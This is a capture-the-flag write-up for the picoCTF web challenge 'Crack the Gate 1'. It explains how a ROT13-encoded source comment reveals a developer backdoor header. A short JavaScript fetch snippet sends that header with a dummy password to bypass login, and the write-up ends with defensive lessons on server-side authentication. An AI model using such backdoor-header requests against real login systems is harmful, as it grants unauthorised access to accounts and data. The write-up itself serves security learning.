# Crack the Gate 1

**Category:** Web    
**Date:** 2026-09-03  
**Author:** Luke Bray

---

## Challenge Description

> We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?

---

## TL;DR

There was a comment left in the code which described a header which could be populated to give access. This vulnerability is a developer backdoor vulnerability and appears in OWASP Top 10 as Insecure Direct Access / Broken Access Control. It allows access to be controlled client side. 

---

## Recon

I found a comment in the code that should have been deleted before the code was pushed to production. I inspected the source to find this. 

---

## Vulnerability / Analysis

The root cause is allowing the header to be changed client-side and having access client side controlled. The header should be removed entirely. Access should be validated server side with session ids or JWT tokens using a secret that the public does not have. 

---

## Exploitation / Solution

1. Inspect the source and see the comment
2. Go to cyber chef and decrypt the comment. It is ROT13. The header is revealed. 
3. Open chrome dev console and run code below and the flag will be returned. 

```javascript
const formData = {email: 'ctf-player@picoctf.org', password: 'test'}
fetch("/login", {
						method: "POST",
						headers: {
							"Content-Type": "application/json",
							"X-Dev-Access": "yes",
						},
						body: JSON.stringify(formData),
					})
						.then((response) => response.json())
						.then((data) => {
							console.log(data)
                        })
```

---

## Lessons Learned

- Learned that authentication should be done server side always
- Any quick access for devs should be tightly controlled. For example, dev access like this could use IP or network restrictions

---

## References

